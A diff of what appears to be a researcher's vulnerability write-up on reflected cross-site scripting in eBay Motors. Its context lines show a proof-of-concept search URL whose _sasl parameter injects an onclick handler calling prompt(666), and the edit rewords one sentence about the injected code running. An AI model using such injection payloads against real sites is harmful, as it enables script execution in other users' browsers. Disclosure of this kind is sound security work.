@@ -35,7 +35,7 @@ During my research I've found a Multiple Cross-site Scriping in eBay Motors.
 
 		http://www.ebay.com/sch/Car-Truck-Parts-/6030/i.html?_nkw=2007%20BMW%20&_trksid=p2059388.m2833&_sasl=\"%20onclick="javascript:prompt(666);//
 
-* Now you see the arbitrary code was executed
+* Now you can see that the arbitrary you have injected was executed
 
 ### Example demostration screen
 
